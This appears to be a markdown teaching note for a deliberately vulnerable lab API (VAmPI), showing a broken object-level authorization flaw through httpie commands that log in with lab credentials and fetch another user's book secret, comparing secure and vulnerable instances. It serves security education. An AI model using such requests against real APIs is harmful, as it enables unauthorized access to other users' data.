# Handy shortcuts

Grab the auth token more easily:
`http :5002/books/v1/bookTitle97 Authorization:"Bearer $(http :5001/users/v1/login username=admin password=pass1|jq -r .auth_token)"`



## Teaching & Learning notes

Note that "bookTitle97" doesn't belong to "admin", it actually belongs to "name2"! This means that it's a BOLA to be able to access it. If you make the call to Vampi running securely, the call should fail on books that do not belong to the user. However, if you make the call to Vampi running vulnerably, the call will succeed and show you the other user's secret.

For example:

To start, find the titles and owners of the books:

`http :5001/books/v1`

Output:

```
        {
            "book_title": "bookTitle16",
            "user": "name1"
        },
        {
            "book_title": "bookTitle97",
            "user": "name2"
        },
        {
            "book_title": "bookTitle22",
            "user": "admin"
        }
```

This means that in a secure system, only the user of the book should be allowed to see the secret associated with the book title. For example:

Secure call using actual book owner/user:

`http :5001/books/v1/bookTitle97 Authorization:"Bearer $(http :5001/users/v1/login username=name2 password=pass2|jq -r .auth_token)"`

Returns success (as expected):

`{
    "book_title": "bookTitle97",
    "owner": "name2",
    "secret": "secret for bookTitle97"
}`

Now, if I make another secure call to a book that same user DOES NOT own, what do you think should happen? That's right! The call SHOULD fail. Let's see:

Secure call using owner/user to a book they do not use/own:

`http :5001/books/v1/bookTitle97 Authorization:"Bearer $(http :5001/users/v1/login username=name1 password=pass1|jq -r .auth_token)"`

Returns failure (as expected):

`{
    "message": "Book not found!",
    "status": "fail"
}`

But now let's make the same call to an insecure implementation:

`http :5002/books/v1/bookTitle97 Authorization:"Bearer $(http :5001/users/v1/login username=name1 password=pass1|jq -r .auth_token)"`

Notice that it unexpectedly returns a success:

`{
    "book_title": "bookTitle97",
    "owner": "name2",
    "secret": "secret for bookTitle97"
}`

I've authenticated as `name1` but I'm able to retrieve the book that belongs to `name2` and see the secret associated with that book!

